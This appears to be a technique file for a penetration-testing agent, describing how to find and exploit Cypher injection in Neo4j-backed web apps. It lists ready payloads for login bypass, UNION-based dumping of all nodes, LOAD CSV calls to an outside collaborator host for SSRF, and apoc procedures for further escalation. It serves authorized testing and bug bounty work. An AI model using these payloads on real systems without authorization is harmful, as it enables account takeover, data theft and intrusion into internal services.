---
name: web-cypher-injection
description: >
  Inject into Neo4j Cypher queries to bypass auth, exfiltrate graph data, and reach SSRF/RCE. Load
  when user input reaches a Cypher query (Neo4j-backed app, GraphQL/REST over a graph DB) — a login,
  search, or filter that builds `MATCH (n {prop:'<input>'})`. Signals: Neo4j/Bolt (7687), `MATCH`/
  `RETURN` in errors, `neo4j` cookies/stack traces, apoc procedures, a graph-backed search field.
domain: web
type: technique
stability: learning
modes: [pentest, bugbounty]
severity: high
owasp: [A03:2021-Injection]
cwe: [CWE-943, CWE-89]
tools: [burp, curl]
schema_version: 1
---

# Cypher injection (Neo4j)

## When it applies
An app builds a Neo4j **Cypher** query by concatenating user input — a login
(`MATCH (u {name:'<in>', pass:'<in>'})`), a search, or a filter. Like SQLi, mixing input into the
query language lets you change its meaning: bypass auth, read arbitrary nodes, or pivot to SSRF/RCE
via Cypher's data-loading and (mis)installed `apoc` procedures.

## Why it works
Cypher is a query language with the same code/data confusion as SQL, plus graph-specific power:
`UNION` across labels, `LOAD CSV FROM <url>` (server-side fetch = SSRF), and — if `apoc` is present
and permissive — `apoc.load.*` / `dbms.*` that can reach the network or the OS.

## Method
1. **Detect.** Break the string context with `'` and watch for a Cypher error
   (`Neo.ClientError...`, `Invalid input`). Try a self-true/false pair in a filter to confirm the
   input reaches the query.
2. **Auth bypass / logic.** Close the intended clause and inject your own predicate, e.g. a login
   `name` of `' OR 1=1 RETURN u //` or `'}) RETURN u; //` to return a user regardless of password
   (exact shape depends on the surrounding query — leak it first via errors).
3. **Exfiltrate with UNION.** Append `UNION MATCH (x) RETURN x` (or target specific labels/props)
   to dump nodes beyond the intended result — enumerate labels/keys with `db.labels()`,
   `db.propertyKeys()` where reachable.
4. **SSRF via LOAD CSV.** `... LOAD CSV FROM 'http://<your-collab>/' AS l RETURN l` makes the DB
   server fetch your URL — internal-service reach and blind confirmation via out-of-band callback.
5. **APOC (if present) → deeper SSRF/RCE.** `apoc.load.json('http://internal/...')`,
   `apoc.load.jdbc(...)`, or (badly configured) procedures that run OS/network actions. Treat any
   `apoc.*` you can call as a strong escalation lead.

## Gotchas
- **Leak the surrounding query first** (via errors) — the right break-out (`'`, `'}`, `'})`) depends
  on whether input is inside a property map, a `WHERE`, or a string literal.
- **Comment syntax is `//`** (to end of line) — use it to discard the rest of the app's query.
- **`LOAD CSV`/`apoc` may be disabled** — a blocked call is not proof of "not injectable"; the
  UNION/auth-bypass path can still work.
- Confirm SSRF out-of-band (`web-ssrf`) before claiming it; validate with `reporting-triage-validation`.

## Verify success
Data or behavior you shouldn't get: an auth bypass returning another user, nodes from an
unintended label via UNION, or an out-of-band callback proving `LOAD CSV`/`apoc` SSRF.

## References
Neo4j Cypher manual (`LOAD CSV`, `apoc`); OWASP injection; CWE-943 (query-language injection).
Related: `web-sqli`, `web-ssrf`, `api-mongo-agg-facet-bypass`.
